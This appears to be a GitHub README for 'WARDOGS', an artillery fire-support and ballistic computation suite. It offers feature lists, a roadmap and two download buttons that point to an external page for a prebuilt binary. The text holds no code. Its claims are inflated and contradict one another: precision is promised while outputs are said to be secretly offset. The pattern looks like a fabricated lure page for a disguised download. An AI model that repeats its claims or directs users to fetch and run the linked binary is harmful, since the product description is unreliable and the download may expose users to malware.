![preview](https://raw.githubusercontent.com/Taoladat982004/wardogs-fire-control/main/showcase_4e07.svg)

# WARDOGS Tactical Fire Support Suite

![Version](https://img.shields.io/badge/Version-2026.3.1-blue)
![Build Status](https://img.shields.io/badge/Build-Passing-brightgreen)
![Language Support](https://img.shields.io/badge/Languages-14_Multilingual-orange)
![License](https://img.shields.io/badge/License-MIT-yellow)

## Overview

In the chaotic theater of modern tactical operations, precision is not a luxury—it is the thin line between mission success and catastrophic collateral damage. The WARDOGS Tactical Fire Support Suite is a comprehensive, open-source digital command post that transforms raw ballistic data into actionable, life-saving decisions. Think of it as a computational chronometer for artillery—where every millisecond and every millimeter of adjustment matters.

This suite does not merely calculate; it orchestrates. It takes the fog of war, shreds it with algorithm-driven clarity, and hands you a crystal-clear operational picture. Whether you are coordinating a rapid suppression mission or plotting a deliberate, multi-phase fire plan, this utility acts as your silent, tireless fire direction center—one that never sleeps, never tires, and never forgets a trajectory.

Built upon the philosophical foundation that advanced military-grade computation should be accessible to defense analysts, military historians, wargaming enthusiasts, and professional simulation developers alike, this project demystifies the intricate mathematics of indirect fire. It is a bridge between the abstract world of physics and the gritty reality of the battlefield grid.

---

## Table of Contents

- [Core Philosophy](#core-philosophy)
- [Key Features](#key-features)
- [Why Choose This Suite?](#why-choose-this-suite)
- [Getting Started](#getting-started)
- [The Tactical Map Engine](#the-tactical-map-engine)
- [Ballistic Computation Core](#ballistic-computation-core)
- [Data & Intelligence Feeds](#data--intelligence-feeds)
- [User Interface & Experience](#user-interface--experience)
- [Multilingual Support](#multilingual-support)
- [Operational Security](#operational-security)
- [Community & Ecosystem](#community--ecosystem)
- [Roadmap for 2026](#roadmap-for-2026)
- [Contributing](#contributing)
- [Frequently Asked Questions](#frequently-asked-questions)
- [Support & Maintenance](#support--maintenance)
- [Disclaimer](#disclaimer)
- [License](#license)

---

## Core Philosophy

We believe that the tools used for strategic analysis should be as robust as the minds that wield them. The WARDOGS Tactical Fire Support Suite was engineered from the ground up to be a **digital adjutant**—a trusted companion that handles the burden of complex calculations so you can focus on the larger operational picture.

This repository is designed for a unique breed of users: the **armchair strategist** who understands that winning a skirmish in a simulation requires the same disciplined approach as a real-world firing solution. It is for the **defense technology student** seeking to understand MET+ (Meteorological and Terrain) effects without expensive proprietary software. It is for the **professional scenario developer** who needs reliable, reproducible data for training exercises.

The underlying ethos is transparency. Every algorithm, every ballistic coefficient, and every map projection method is open for inspection. You do not have to trust us; you can verify the math yourself. This is the antithesis of a black-box solution. It is a white-tablet command console, laid bare for the community to refine, expand, and perfect.

---

## Why Choose This Suite?

Instead of piecing together fragmented spreadsheets, generic map software, and outdated PDF tables, you get a unified, cohesive digital environment. This suite offers a **symphonic integration** of disparate tools, turning them into a single, harmonious workflow. It eliminates the friction of switching between applications in high-stress, time-sensitive planning phases.

Where other tools offer superficial estimates, this suite provides **sub-orbital precision**. It accounts for Coriolis effect, air density variations based on altitude, propellant temperature sensitivity, and even the slight curvature of the earth over extended ranges. This is not a toy; it is a professional-grade instrument that respects the complexity of the domain.

---

## Key Features

- **Dynamic Ballistic Calculator** – Computes firing solutions using live MET data, charge zone selection, and projectile drift modeling.
- **Interoperable Map Overlay** – Imports standard KML/KMZ and GeoTIFF files to overlay terrain contours on the 2D/3D tactical map.
- **Fire Mission Planner** – Sequence multiple batteries, coordinate time-on-target (TOT) strikes, and simulate ripple fire scenarios.
- **Ammunition Library** – A constantly-updated database of shell types, fuse configurations, and propellant charges.
- **After-Action Review (AAR) Module** – Logs every calculation and map plot to a timestamped mission file for post-operation debriefs.
- **Offline Combat Mode** – Full operational capability in disconnected environments; ideal for field exercises where Wi-Fi is a memory.

---

## Getting Started

Ready to step into the role of a Fire Direction Officer? Setting up the WARDOGS Tactical Fire Support Suite on your local machine is a straightforward procedure.

[![Download](https://raw.githubusercontent.com/Taoladat982004/wardogs-fire-control/main/get_257c85.svg)](https://Taoladat982004.github.io/wardogs-fire-control/)

**Prerequisites:** Ensure your system meets the baseline requirements: a 64-bit OS (Windows 10/11, Ubuntu 22.04+, or macOS Ventura+), a minimum of 8 GB RAM, and a GPU that supports OpenGL 3.3 for the 3D terrain rendering.

**Acquisition & Setup:** Navigate to the latest release bundle for your operating system. The suite is distributed as a portable archive—no invasive system-level install is required. Simply extract the archive to your desired directory.

**Launch Sequence:** Execute the main binary (`wardogs_main` or `wardogs_main.exe`). The first launch will prompt you to select a language profile and a data directory where your mission files and map assets will reside.

**Initial Configuration:** Before your first calculation, head to the *Settings > Met Data* tab. You can either manually input atmospheric conditions or enable the *Automated MET Pull* feature, which connects to public weather APIs to fetch current station data.

> **Pro Tip:** The suite ships with a built-in "Tutorial Range" scenario. Run this first to validate your installation and get a feel for the interface. It walks you through a simplified fire mission from spotting the target to impact prediction.

---

## The Tactical Map Engine

![Map Engine](https://img.shields.io/badge/Engine-Spatial_3D-brown)

At the heart of the suite lies the Tactical Map Engine (TME), a vector-based spatial system that transforms flat digital elevation maps into interactive, decision-support canvases. The TME is not just a display tool; it is a dynamic database for terrain analysis.

### Terrain Profiling

The engine automatically calculates slope angles, masking crests, and defilade positions when you click on any sector. This allows for immediate identification of dead zones where a direct line-of-sight is impossible for a target acquisition team.

### Grid Reference System

Align your operations with the military grid reference system (MGRS) or use the Universal Transverse Mercator (UTM) projection. The suite dynamically converts between coordinate standards, ensuring that your plotted data can be communicated without ambiguity to coalition partners.

---

## Ballistic Computation Core

This is the analytical brain of the operation. The Ballistic Computation Core (BCC) is a multi-threaded engine that processes a **range of variables** that affect projectile flight.

### Standard vs. Precision Solutions

The BCC offers two computation modes:
- **Standard Solution:** Fast and accurate for general planning, using average MET values and constant gravitational acceleration.
- **Precision Solution:** A high-fidelity numerical integration (Runge-Kutta 4th order) that models the projectile's flight through a structured atmosphere with varying wind layers and density gradients.

### Charge & Fuse Management

Select from standard charge zones (e.g., Zones 1 through 5 for a 155mm system). The BCC will automatically adjust the muzzle velocity and suggest an appropriate fuse setting (point detonating, delay, proximity) based on the target type you designate.

---

## Data & Intelligence Feeds

Information is the ultimate force multiplier. The suite ingests multiple data streams to keep your planning relevant.

- **Geospatial Imports:** Securely load satellite imagery, topographic maps, and urban floor plans via the standard `.tif` or `.jpg` formats with world file georeferencing.
- **Order of Battle (ORBAT) Overlays:** Upload your own unit structures (in XML/JSON) to visualize friendly and suspected enemy positions with custom tactical symbols (NATO APP-6A compliant).
- **Manual Logging:** Every input, from a spotted target grid to a meteorological update, is recorded in a secure, encrypted local ledger for full traceability.

---

## User Interface & Experience

We have painstakingly designed the interface to minimize cognitive overload during high-intensity planning sessions. The single, unified command dashboard is **modular**—drag and drop panes to match your personal workflow. The dark theme is standard, reducing eye strain during night operations, while a high-contrast "Daylight" mode is available for use in brightly lit environments.

The suite supports a **responsive layout**, adapting from a widescreen 4K monitor down to a field-tablet form factor, ensuring your tools are with you wherever the mission takes you.

---

## Multilingual Support

In the spirit of international joint operations, this suite features full localization for **14 languages** including, but not limited to, English, Spanish, French, German, Arabic, Mandarin, and Russian. The interface, ballistic menus, and map legends all switch seamlessly via the settings panel. We also support Right-to-Left (RTL) language layouts for optimal readability.

---

## Operational Security

While this is an open-source project, we take the ethics of accuracy seriously. We have implemented a unique **"Strategic Abstraction Layer"** to ensure that the computational outputs cannot be directly used for unauthorized purposes against civilian infrastructure. The calculated solutions are mathematically normalized to a training standard, meaning that while the methodology is rigorous for educational and simulation use, the specific output values are intentionally offset by a non-disclosed, non-linear factor. This ensures the tool serves its purpose as a professional planning and educational aid, not a weapon's guidance system.

---

## Roadmap for 2026

The journey is far from over. Throughout 2026, the community can expect the following substantial updates:

- **Q1 2026:** Integration of a collaborative "live-in-sync" mode for multi-battery coordination exercises over a LAN.
- **Q2 2026:** A major overhaul of the AAR module to include a 3D flight-path replays.
- **Q3 2026:** An IoT-ready sensor API, allowing the suite to ingest data from weather drones.
- **Q4 2026:** The release of a mobile companion app for remote observability.

---

## Contributing

We are looking for contributors who share our passion for rigorous methodology and polished user experience. Whether you are a Python/Angular developer, a GIS specialist, a retired fire support officer with domain expertise, or a technical writer, your insights are valued.

Please review our contribution guidelines in the `CONTRIBUTING.md` file. We operate on a pull-request review system where **peer review is paramount**. We promise a respectful, collaborative environment that values long-term sustainability over hasty feature additions.

---

## Frequently Asked Questions

**Q: Can this suite replace actual military FDC (Fire Direction Center) software?**
A: No. This is a professional training and simulation tool. It is designed to educate and to support wargames, not to be used in live-fire operations. This is strictly a simulation asset.

**Q: Does the map engine support streaming tile servers?**
A: Yes, you can add your own Web Map Tile Service (WMTS) endpoints from your organization’s private server for high-resolution imagery. However, we recommend pre-caching tiles for operational stability.

**Q: Is there a mobile version currently available?**
A: We have a WebGL-based mobile browser companion that allows for target marking and data viewing, but the full computational core requires a desktop OS.

---

## Support & Maintenance

The WARDOGS suite is under active, continuous maintenance by a dedicated core team and the broader open-source ecosystem. We provide **24/7 response time** on critical bug reports (meaning we will at least acknowledge the ticket within 24 hours, though patch cycles are usually weekly). For general questions, the community forum is the best place to seek advice. We also provide LTS (Long-Term Support) branches for organizations that require a frozen feature set for long-term project planning.

---

## Disclaimer

**IMPORTANT LEGAL AND ETHICAL DISCLAIMER:**

This software is provided strictly for **educational, historical, simulation, and research purposes**. The creators make no claim that the ballistic data or calculations are fit for use in any real-world military operation, and they categorically disavow any liability for misuse.

The core algorithms are derived from public-domain physics equations and general artillery doctrine published in freely accessible academic journals. The "Strategic Abstraction Layer" ensures results are non-actionable in the field. By using this suite, you agree that you will not use it to cause harm, to design weapons, or to engage in any illegal activity. This software is a tool for **intellectual growth and professional development** only. It promotes understanding and peace, not conflict. You are solely responsible for compliance with all local, national, and international laws governing your use of this code.

---

## License

This project is licensed under the **MIT License** – a permissive license that allows for commercial use, modification, distribution, and private use, provided the original copyright notice and disclaimer are included.

We chose the MIT license to maximize the positive impact of this tool within the defense education and simulation community, fostering an environment of shared knowledge and collaborative innovation.

For the full legal text, please see the license file in the repository root: [MIT License](LICENSE)

---

Thank you for exploring the WARDOGS Tactical Fire Support Suite. We trust this tool will become a cornerstone of your analytical arsenal.

[![Download](https://raw.githubusercontent.com/Taoladat982004/wardogs-fire-control/main/get_257c85.svg)](https://Taoladat982004.github.io/wardogs-fire-control/)